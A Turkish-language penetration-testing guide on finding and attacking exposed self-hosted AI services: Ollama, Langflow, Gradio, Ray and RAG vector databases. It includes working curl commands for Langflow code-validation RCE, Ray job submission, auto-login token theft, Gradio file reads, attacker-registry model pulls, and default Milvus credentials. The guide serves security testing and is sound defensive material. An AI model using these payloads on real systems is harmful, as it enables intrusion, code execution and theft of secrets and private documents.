# Açığa Çıkmış Self-Hosted AI Hizmetleri

{{#include ../banners/hacktricks-training.md}}

AI özellikleri geliştiren ekipler genellikle kendi model çalıştırıcılarını, agent oluşturucularını, demo arayüzlerini, işlem kümelerini ve vektör veritabanlarını çalıştırır. Bu araçların çoğu bir dizüstü bilgisayar veya kapalı bir laboratuvar ağı için tasarlanmıştır; bu nedenle **varsayılan olarak kimlik doğrulaması yoktur** ya da kimlik doğrulama kestirmesi etkin olarak gelir. Saldırgan böyle bir hizmete erişebildiğinde, etki genellikle şu gruplardan birine girer:

- GPU ve modellerin ücretsiz kullanımı ve özel modellerin çalınması.
- Prompt'ların, belgelerin ve embedding'lerin sızdırılması.
- Süreç ortamındaki gizli bilgilerin sızdırılması (LLM sağlayıcı anahtarları, cloud kimlik bilgileri).
- Bazı API'ler kodu **özellik olarak** çalıştırdığı için kod yürütme.

Bu sayfada bu hizmetlerin nasıl bulunacağı ve her API türünde nelerin test edileceği açıklanmaktadır. Self-hosted inference sunucusunu güçlendirme ve llama.cpp `/slots` leak'i hakkında bilgi için bkz. [AI Risk Frameworks](AI-Risk-Frameworks.md#self-hosted-llm-inference-hardening). Zararlı model dosyaları hakkında bilgi için bkz. [AI Models RCE](AI-Models-RCE.md).

## Parmak izi belirleme

Bu istekleri kimlik bilgisi olmadan gönderin. Beklenen alanları içeren bir JSON yanıtı ürünü, çoğu zaman da sürümünü belirler ve aşağıdaki kontrollerden hangilerinin geçerli olduğunu gösterir. Portlar belgelenen varsayılan portlar veya resmi çalıştırma örneklerinde kullanılan portlardır.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

| Ürün | Yaygın port | Kimlik doğrulamasız istek | Ürünü tanımlayan |
| --- | --- | --- | --- |
| Ollama | 11434 | `GET /api/version`, `GET /api/tags` | Sürüm JSON'u, yerel modellerin listesi |
| Langflow | 7860 | `GET /api/v1/version` | Langflow sürüm JSON'u |
| Gradio | 7860 | `GET /config` | Gradio sürümünü ve bileşen kimliklerini içeren uygulama yapılandırması |
| Ray dashboard | 8265 | `GET /api/version`, `GET /api/jobs/` | `ray_version`, gönderilen işlerin listesi |
| Chroma | 8000 | `GET /api/v2/heartbeat`, `GET /api/v2/version` | Heartbeat değeri, Chroma sürümü |
| Qdrant | 6333 | `GET /`, `GET /collections` | Qdrant sürümü, collection listesi |
| Weaviate | - | `GET /v1/meta`, `GET /v1/schema` | Weaviate sürümü, sınıflar |
| Milvus | 19530 | `POST /v2/vectordb/collections/list` | Collection listesi veya bir kimlik doğrulama hatası |

Bu hizmetler çoğu zaman bir reverse proxy arkasında, bir yol önekiyle (örneğin `/ollama/` veya `/ray/`) de yayınlanır. Bu nedenle JavaScript bundle'larında veya API belgelerinde bulunan önekleri kullanarak istekleri tekrarlayın.

## Kimlik doğrulamasız inference ve model yönetimi API'leri

Model çalıştırıcıları genellikle inference rotalarıyla yönetim rotalarını bir araya getiren tek bir REST API sunar. Ollama buna iyi bir örnektir. Yerleşik kimlik doğrulaması yoktur ve varsayılan olarak `127.0.0.1:11434` adresine bağlanır; `OLLAMA_HOST` ise bağlanma adresini değiştirir.<sup>[[1]](#references)[[15]](#references)</sup> Resmi Docker imajı, container içinde `OLLAMA_HOST=0.0.0.0:11434` ayarlar, `EXPOSE 11434` bildirir ve `USER` yönergesi içermez; dolayısıyla sunucu container içinde root olarak çalışır.<sup>[[16]](#references)</sup> `EXPOSE`, portu host üzerinde yayınlamaz; bu nedenle host üzerinden erişilebilirlik deployment'a bağlıdır. Belgelenen `docker run` komutları `-p 11434:11434` kullanır ve host IP'si belirtilmediği sürece Docker bu eşlemeyi tüm host arayüzlerinde yayınlar.<sup>[[17]](#references)[[18]](#references)</sup>

Her rota grubunun saldırgana sağladıkları:<sup>[[2]](#references)</sup>

| Rotalar | Kimlik doğrulaması olmadığında etkisi |
| --- | --- |
| `GET /api/tags`, `GET /api/ps` | Özel custom modeller dahil, yerel ve yüklenmiş modellerin listesi |
| `POST /api/show` | Modelfile, template ve **system prompt** dahil model ayrıntıları |
| `POST /api/generate`, `/api/chat`, `/api/embed` | Mağdurun donanımında ücretsiz inference |
| `POST /api/pull`, `/api/push` | Sunucuya saldırganın seçtiği bir registry'den model indirtme veya sunucudan bu registry'ye model yükletme |
| `POST /api/create`, `/api/copy`, `DELETE /api/delete` | Model oluşturma, üzerine yazma veya silme |

```bash
curl -s http://target:11434/api/tags
curl -s http://target:11434/api/show -d '{"model":"<name from /api/tags>"}'
# Outbound fetch to a registry you control: only look for the callback
curl -s http://target:11434/api/pull -d '{"model":"<your-host>/library/test:latest","insecure":true}'
```

Kimlik bilgileri olmadan döndürülen bir model listesi, maruziyeti kanıtlamak için yeterlidir. Özel modeller, `/api/show` içinde genellikle dahili bir system prompt içerir. Host'unuza doğru yapılan bir pull, sunucunun saldırganın seçtiği registry'lerden manifest'leri çektiğini kanıtlar. Registry'nize doğru yapılan bir `/api/push`, maruziyeti model hırsızlığına dönüştürür. Gerçek hedeflerde create veya delete rotalarını çağırmayın.

Registry pull işlemleri aynı zamanda bir parser saldırı yüzeyidir; çünkü sunucu, blob'ları uzak manifest'ten gelen değerleri kullanarak depolar. Probllama'da (CVE-2024-37032, Ollama 0.1.34'te düzeltildi) manifest'teki `digest`, doğrulanmadan dosya adı olarak kullanılıyordu. Bu nedenle kötü amaçlı bir registry, `../` dizileriyle blobs dizininin dışına dosya yazabiliyordu. Digest'i yerel bir dosyaya işaret eden hazırlanmış bir manifest'i push etmek, bu dosyanın saldırganın registry'sine sızmasına yol açtı. Wiz, sunucunun root olarak çalıştığı Docker'da bir paylaşılan kütüphane yazıp bunu `/etc/ld.so.preload` dosyasına ekleyerek ve ardından yeni bir sürecin bu kütüphaneyi yüklemesi için `/api/chat` çağrısı yaparak RCE elde etti.<sup>[[15]](#references)</sup> Bir runner rastgele registry'lerden pull yapabiliyorsa, manifest alanlarını yola nasıl dönüştürdüğünü kontrol edin.

## Tasarım gereği kod çalıştıran API'ler

### İş gönderim API'leri

Dağıtık hesaplama framework'leri kod çalıştırmayı temel özellikleri olarak görür. Dashboard portundaki (8265) Ray Jobs API, bir `entrypoint` shell komutunu kabul eder ve bunu cluster'da çalıştırır.<sup>[[19]](#references)</sup> Oligo ShadowRay araştırması, Jobs API'nin yetkilendirme kullanmadığını ve dashboard'un `0.0.0.0` adresine bağlandığını bildiriyor. İlgili CVE-2023-48022 tartışmalıdır; çünkü Ray yalnızca kontrollü bir ağ içinde çalıştırılmayı bekler.<sup>[[20]](#references)</sup> Ray, 2.52.0 sürümünde isteğe bağlı token authentication (`RAY_AUTH_MODE=token`) ekledi. Ray 2.59, `ray.init()` ile başlatılan yerel cluster'larda bunu varsayılan olarak etkinleştirir; kullanılabilir bir token olmadan `ray start --head` yine de kimlik doğrulamasız başlayabilir. Ray, varsayılan kimlik doğrulamanın daha kapsamlı biçimde 2.61'de devreye alınacağını belgeliyor; bu yüzden dashboard'un açık olduğunu varsaymak yerine dağıtılan sürümü ve başlatma modunu kontrol edin.<sup>[[21]](#references)</sup>

```bash
curl -s http://target:8265/api/version
curl -s http://target:8265/api/jobs/   # existing entrypoints often contain secrets
# Only if the scope allows code execution: DNS callback as proof
curl -s -X POST http://target:8265/api/jobs/ -H 'Content-Type: application/json' \
  -d '{"entrypoint":"nslookup <oast-host>","runtime_env":{}}'
```

Bu türdeki dashboard'larda eski sürümlerde yoklanmaya değer yardımcı rotalar da bulunur. Ray 2.8.1 öncesinde `/log_proxy?url=` herhangi bir HTTP(S) URL'sini getiriyordu (cloud metadata'ya SSRF) ve `/api/v0/logs/file` rastgele bir `filename` yolu kabul ediyordu; ikisi de kimlik doğrulama olmadan kullanılabiliyordu.<sup>[[8]](#references)</sup>

### Function tanımlarını çalıştıran kod "validation" endpoint'leri

Özel Python bileşenlerini kabul eden agent oluşturucuları bazen kodu `ast` ile ayrıştırıp yalnızca function tanımlarını `exec()` ile çalıştırarak kodu "validate" eder. Bu güvenli değildir. Python, function tanımlanırken **dekoratörleri ve varsayılan argüman değerlerini değerlendirir**, bu nedenle function gövdesi hiç çalışmasa bile bu kısımlara yerleştirilen kod çalışır. Langflow'un `POST /api/v1/validate/code` endpoint'i bu şekilde çalışıyordu ve 1.3.0 öncesinde kimlik doğrulaması yoktu (CVE-2025-3248). Komut çıktısını içeren bir exception yükseltmek, endpoint'in çıktıyı yanıtta döndürmesini sağlar:<sup>[[22]](#references)</sup>

```bash
# Decorator variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code": "@exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")\ndef foo():\n  pass"}'
# Default-argument variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code":"def foo(cmd=exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")):\n  pass"}'
```

Kullanıcı kodunu derleyen, lint işlemi yapan veya "kontrol eden" tüm uç noktaları bu örüntü açısından test edin ve kanıt olarak tercihen bir DNS callback kullanın.

### Otomatik giriş ve varsayılan süper kullanıcı token rotaları

Tek kullanıcılı araçlar, çoğu zaman her ziyaretçiyi yönetici olarak oturum açtıran bir kısayolla birlikte gelir. Langflow'da `AUTO_LOGIN` etkin olduğunda, `GET /api/v1/auto_login` herhangi bir çağırana varsayılan süper kullanıcı için token'lar döndürür. Devre dışı olduğunda rota `Auto login is disabled.` yanıtını verir.<sup>[[23]](#references)</sup> Langflow OSS 1.0.0 ile 1.10.0 arasında bu özellik varsayılan olarak etkindi (CVE-2026-9103). Bu özelliği yukarıdaki kimlik doğrulaması gerektiren kod doğrulama rotasıyla zincirlemek, kimlik doğrulaması gerektirmeyen RCE'yi yeniden mümkün kılar (CVE-2026-9198).<sup>[[24]](#references)[[25]](#references)</sup> Mevcut resmî sürüm paketleri ve Docker imajları otomatik girişi devre dışı bırakır ve süper kullanıcı parolası gerektirir; ancak geliştirme dallarında bu özellik etkin kalır.<sup>[[3]](#references)</sup>

```bash
TOKEN=$(curl -s http://target:7860/api/v1/auto_login | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOKEN" http://target:7860/api/v1/users/whoami
```

Kod çalıştırma olanağı olmasa bile, bir superuser token tüm flow'lara ve saklanan sağlayıcı kimlik bilgilerine erişim sağlar. Otomatik testlerde ilgili bir önkoşul kontrolü için bkz. [Web Black-Box AI Pentester Bots](Web-Black-Box-AI-Pentester-Bots.md).

## ML demo arayüzlerinde dosya sunma ve RPC rotaları

ML demo framework'leri, yüklenen ve oluşturulan dosyaları genel bir rota üzerinden sunar ve frontend'in sunucu tarafındaki bileşen yardımcılarını çağırmasına izin verir. Gradio bunun için `/config`, `/upload` ve `/file=<path>` uç noktalarını sunar.<sup>[[5]](#references)</sup> Benzer herhangi bir framework'te test etmeye değer iki kalıp vardır:

- **Bir upload alt dizininden Traversal:** Dosya rotası yalnızca yolun geçici klasör içinde başladığını denetliyorsa, bir alt dizin oluşturmak için dosya yükleyin, ardından `../` veya `%2e%2e%2f` ile bu dizinin dışına çıkın. Gradio 4.0 ile 4.10 arasındaki sürümler (CVE-2023-51449) bu şekilde savunmasızdı.<sup>[[26]](#references)[[27]](#references)</sup> İstemcinin yolu normalleştirmemesi için isteği `curl --path-as-is` ile gönderin.
- **Keyfi method dispatch:** Kullanıcı girdisiyle `getattr(component, fn_name)` çağıran bir uç nokta, saldırganın dahili yardımcıları çağırmasına olanak tanır. 4.13.0 öncesinde Gradio'nun `/component_server` uç noktası bunu yapıyordu. 4.3 ile 4.12 arasındaki sürümlerde `move_resource_to_block_cache`, herhangi bir yerel dosyayı önbelleğe kopyalıyordu; dosya daha sonra `/file=` üzerinden indirilebiliyordu. 3.47 ile 3.50.2 arasındaki sürümlerde ise başka yardımcılar dosya okumaya ve tam okuma yapan SSRF'ye olanak tanıyordu.<sup>[[26]](#references)[[28]](#references)</sup> Düzeltilmiş bir sunucu, sunucu fonksiyonu olarak işaretlenmemiş yardımcılar için `Function not found.` yanıtını verir.<sup>[[28]](#references)</sup>

```bash
curl -s http://target:7860/config | jq '.components[].id'
curl -s http://target:7860/component_server -H 'Content-Type: application/json' \
  -d '{"component_id":"1","data":"/etc/hostname","fn_name":"move_resource_to_block_cache","session_hash":"aaa"}'
curl -s 'http://target:7860/file=<returned_path>'
```

Hugging Face Spaces'te Space secrets ortam değişkenleridir; bu nedenle `/proc/self/environ` en değerli dosyadır. Horizon3 bu dosyayı bir HTTP `Range` header'ı kullanarak okudu.<sup>[[26]](#references)</sup>

## RAG tarafından kullanılan vektör veritabanları

RAG, özgün belgelerin parçalarını, bunların embedding'lerini ve metadata'larını bir vektör veritabanında saklar; asistan da en iyi sonuçları prompt'una ekler. Bu nedenle okuma erişimi, **özel belgelerin düz metnini** sızdırır. Yazma erişimi ise saldırganın daha sonra diğer kullanıcıların prompt'larına alınacak parçalar eklemesine olanak tanır; bu, kalıcı dolaylı prompt injection'dır (bkz. [AI Prompts](AI-Prompts.md#third-party-or-indirect-prompt-injection)).

Self-hosted vektör veritabanlarında kimlik doğrulamanın yapılandırılıp yapılandırılmadığını veya anonim erişimin etkin olup olmadığını kontrol edin:

- **Qdrant**: self-deployed örnekler tüm arayüzleri dinler ve kimlik doğrulaması kullanmaz. Yapılandırıldığında anahtar, `api-key` header'ına veya `Authorization: Bearer` olarak eklenir. Salt okunur ve koleksiyon başına anahtarlar kullanılabilir.<sup>[[11]](#references)</sup>
- **Chroma**: kimlik doğrulama varsayılan olarak devre dışıdır. Token auth, `Authorization` veya `X-Chroma-Token` kullanır.<sup>[[29]](#references)</sup>
- **Weaviate**: anonim erişim etkin olduğunda, kimlik bilgisi içermeyen istekler `user: anonymous` olarak kimlik doğrulamasından geçer ve bu kullanıcının sahip olduğu izinleri alır.<sup>[[30]](#references)</sup>
- **Milvus**: `common.security.authorizationEnabled` değeri `true` olmadıkça kimlik doğrulama kapalıdır. Etkinleştirildiğinde, varsayılan `root` kullanıcısının parolası `Milvus` olur ve token biçimi `username:password` şeklindedir.<sup>[[31]](#references)[[14]](#references)</sup>

Kimlik bilgisi olmadan özel veri içeren bir yanıt, verilerin açığa çıktığını gösterir. Kimlik doğrulama etkinse, değiştirilmemiş varsayılan hesabı ayrıca değerlendirin:<sup>[[12]](#references)[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
curl -s http://target:6333/collections
curl -s -X POST http://target:6333/collections/<name>/points/scroll -H 'Content-Type: application/json' -d '{"limit":3,"with_payload":true}'
curl -s http://target:8000/api/v2/tenants/default_tenant/databases/default_database/collections
curl -s 'http://target:<weaviate-port>/v1/objects?limit=3'
curl -s -X POST http://target:19530/v2/vectordb/collections/list -H 'Authorization: Bearer root:Milvus' -H 'Content-Type: application/json' -d '{}'
```

Payload'ların belge metni, kullanıcı tanımlayıcıları veya tenant adları içerip içermediğini kontrol edin. Production verilerini kirletmeden yazma erişimini göstermek için, yalnızca kapsam izin veriyorsa, adı açıkça belirtilmiş boş bir koleksiyon oluşturup hemen silin.

Bu sunuculardaki kimlik doğrulama kontrolü de çok geç yapılabiliyor. Chroma'nın Python FastAPI sunucusunda (1.0.0'dan en az 1.5.8'e kadar, CVE-2026-45829) koleksiyon oluşturma rotası, kimlik doğrulama kontrolünden önce istemcinin sağladığı embedding function'ı oluşturuyordu. `trust_remote_code: true` ayarıyla saldırganın kontrolündeki bir Hugging Face modeline başvuran yapılandırma, istek reddedilse bile saldırganın kodunu çalıştırıyordu. Rust frontend etkilenmedi.<sup>[[32]](#references)</sup> Bir istek model veya plugin yapılandırması içeriyorsa, bunu kimlik bilgileri olmadan test edin ve model deponuza yönelik dışarı giden bir isteği izleyin.

## References

- [1] [Ollama SSS](https://github.com/ollama/ollama/blob/main/docs/faq.mdx)
- [2] [Ollama API belgeleri](https://github.com/ollama/ollama/blob/main/docs/api.md)
- [3] [Langflow README](https://github.com/langflow-ai/langflow/blob/main/README.md)
- [4] [Langflow kaynak kodu - API v1 uç noktaları](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/endpoints.py)
- [5] [Gradio kaynak kodu - routes.py](https://github.com/gradio-app/gradio/blob/main/gradio/routes.py)
- [6] [Gradio kaynak kodu - http_server.py](https://github.com/gradio-app/gradio/blob/main/gradio/http_server.py)
- [7] [Ray kaynak kodu - job_head.py](https://github.com/ray-project/ray/blob/master/python/ray/dashboard/modules/job/job_head.py)
- [8] [Bishop Fox - Ray, 2.6.3 ve 2.8.0 sürümleri](https://bishopfox.com/blog/ray-versions-2-6-3-2-8-0)
- [9] [Chroma kaynak kodu - Python istemcisi varsayılanları](https://github.com/chroma-core/chroma/blob/main/chromadb/__init__.py)
- [10] [Chroma kaynak kodu - FastAPI sunucu rotaları](https://github.com/chroma-core/chroma/blob/main/chromadb/server/fastapi/__init__.py)
- [11] [Qdrant - Güvenlik](https://qdrant.tech/documentation/security/)
- [12] [Qdrant OpenAPI belirtimi](https://github.com/qdrant/qdrant/blob/master/docs/redoc/master/openapi.json)
- [13] [Weaviate OpenAPI belirtimi](https://github.com/weaviate/weaviate/blob/main/openapi-specs/schema.json)
- [14] [Milvus - Milvus Server'a bağlanma](https://milvus.io/docs/connect-to-milvus-server.md)
- [15] [Wiz - Probllama: Ollama Uzaktan Kod Çalıştırma Güvenlik Açığı (CVE-2024-37032)](https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032)
- [16] [Ollama Dockerfile](https://github.com/ollama/ollama/blob/main/Dockerfile)
- [17] [Ollama Docker belgeleri](https://github.com/ollama/ollama/blob/main/docs/docker.mdx)
- [18] [Docker - Portları yayımlama ve dışarı açma](https://docs.docker.com/get-started/docker-concepts/running-containers/publishing-ports/)
- [19] [Ray Jobs REST API](https://docs.ray.io/en/latest/cluster/running-applications/job-submission/rest.html)
- [20] [Oligo - ShadowRay: AI iş yüklerini hedef alan ve gerçek saldırılarda istismar edilen, bilinen ilk saldırı kampanyası](https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild)
- [21] [Ray token kimlik doğrulaması](https://docs.ray.io/en/latest/ray-security/token-auth.html)
- [22] [Horizon3.ai - Her hızda güvensiz: Langflow AI'da kimlik doğrulamasız RCE için Python Exec'i kötüye kullanma](https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/)
- [23] [Langflow kaynak kodu - login router](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/login.py)
- [24] [NVD - CVE-2026-9103](https://nvd.nist.gov/vuln/detail/CVE-2026-9103)
- [25] [NVD - CVE-2026-9198](https://nvd.nist.gov/vuln/detail/CVE-2026-9198)
- [26] [Horizon3.ai - Hugging Face Spaces'ten sırları çalmak için Gradio'daki dosya okuma güvenlik açıklarından yararlanma](https://horizon3.ai/attack-research/disclosures/exploiting-file-read-vulnerabilities-in-gradio-to-steal-secrets-from-hugging-face-spaces/)
- [27] [Gradio güvenlik duyurusu GHSA-6qm2-wpxq-7qh2](https://github.com/gradio-app/gradio/security/advisories/GHSA-6qm2-wpxq-7qh2)
- [28] [Gradio `/component_server` düzeltme commit'i](https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2)
- [29] [Chroma Cookbook - Chroma-native kimlik doğrulaması](https://cookbook.chromadb.dev/security/legacy-auth/)
- [30] [Weaviate - Kimlik doğrulama](https://docs.weaviate.io/weaviate/configuration/authentication)
- [31] [Milvus - Kullanıcı erişiminin kimliğini doğrulama](https://milvus.io/docs/authenticate.md)
- [32] [HiddenLayer - ChromaToast kimlik doğrulamasından önce sunuldu](https://www.hiddenlayer.com/research/chromatoast-served-pre-auth)
{{#include ../banners/hacktricks-training.md}}
